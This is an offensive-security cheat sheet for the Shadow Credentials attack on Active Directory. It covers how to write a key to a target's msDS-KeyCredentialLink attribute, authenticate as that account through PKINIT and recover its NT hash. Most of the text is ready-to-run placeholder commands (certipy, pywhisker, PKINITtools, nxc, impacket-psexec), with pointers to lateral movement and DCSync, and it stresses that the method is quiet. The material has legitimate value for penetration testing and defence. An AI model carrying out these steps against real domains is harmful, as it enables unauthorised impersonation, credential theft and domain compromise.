Shadow Credentials - Cheat Sheet

If you can write to a target's msDS-KeyCredentialLink attribute, you can add
your own certificate-based key to their account, then authenticate AS them via
Kerberos PKINIT and recover their NT hash - no password reset, no detection of
a changed password. A modern, quiet alternative to RBCD.
Replace the placeholders (<...>) with your own values.


Pre-requisites
  - Write rights over the target object: GenericAll / GenericWrite / WriteProperty
    on msDS-KeyCredentialLink (check BloodHound -> "AddKeyCredentialLink" edge).
  - At least one DC running Windows Server 2016+ with AD CS / PKINIT support
    (i.e. the domain supports Key Trust). Works without a vulnerable cert template.


Step 1 - Confirm the write right

In BloodHound, look for an outbound edge from a principal you control to the
target: "AddKeyCredentialLink", "GenericAll", or "GenericWrite".

Targets are usually a computer account or a user you want to impersonate.


Step 2 - Add the shadow credential (certipy)

certipy shadow auto does the whole chain - add key, PKINIT, dump hash, cleanup:

    certipy shadow auto -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -account <target-sam>

For a computer target, the account is the machine name with a trailing $:

    certipy shadow auto -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -account '<target-host>$'

Output prints the target's NT hash (and caches a TGT). Done in one command.


Step 3 - Manual / pywhisker alternative (more control)

3a. Add the key credential and get a PFX:

    pywhisker -d <domain> -u <user> -p <password> --target <target-sam> \
        --action add --filename shadow

3b. Authenticate with the PFX via PKINIT to get a TGT + NT hash:

    certipy auth -pfx shadow.pfx -dc-ip <dc-ip>
    # or:
    gettgtpkinit.py -cert-pfx shadow.pfx -pfx-pass <pass> \
        <domain>/<target-sam> shadow.ccache

3c. (PKINITtools) recover the NT hash from the TGT:

    export KRB5CCNAME=shadow.ccache
    getnthash.py -key <AS-REP-key> <domain>/<target-sam>


Step 4 - Use the recovered hash / ticket

    nxc smb <target-ip> -u <target-sam> -H <nt-hash>
    export KRB5CCNAME=<target>.ccache
    impacket-psexec -k -no-pass <domain>/<target-sam>@<target-fqdn>
    # if target is a computer / DC -> DCSync


Step 5 - Clean up (remove your key)

Shadow creds persist on the object - remove yours when done:

    certipy shadow clear -u <user>@<domain> -p <password> -dc-ip <dc-ip> \
        -account <target-sam>
    # pywhisker: --action remove --device-id <id>


(optional) Fix clock skew - PKINIT fails on time drift:

    sudo ntpdate <dc-ip>


Shadow Credentials vs RBCD (when to pick which)
  - Shadow creds: needs Key Trust (2016+ DC). No extra computer account needed.
    Quieter, self-contained, directly yields the target's hash.
  - RBCD: needs an SPN-holding account you control (often a created machine).
    Use when Key Trust isn't available or you specifically want delegation.
Both abuse the SAME write primitive (GenericWrite/GenericAll over the object).


Key idea: msDS-KeyCredentialLink stores public keys that AD trusts for
passwordless (certificate) logon. If you can write that attribute, you bolt
your own key onto someone's account and log in as them via PKINIT - then pull
their NT hash. It abuses the exact same ACL you'd use for RBCD, but is quieter
and hands you the hash directly. Always remove the key afterwards.
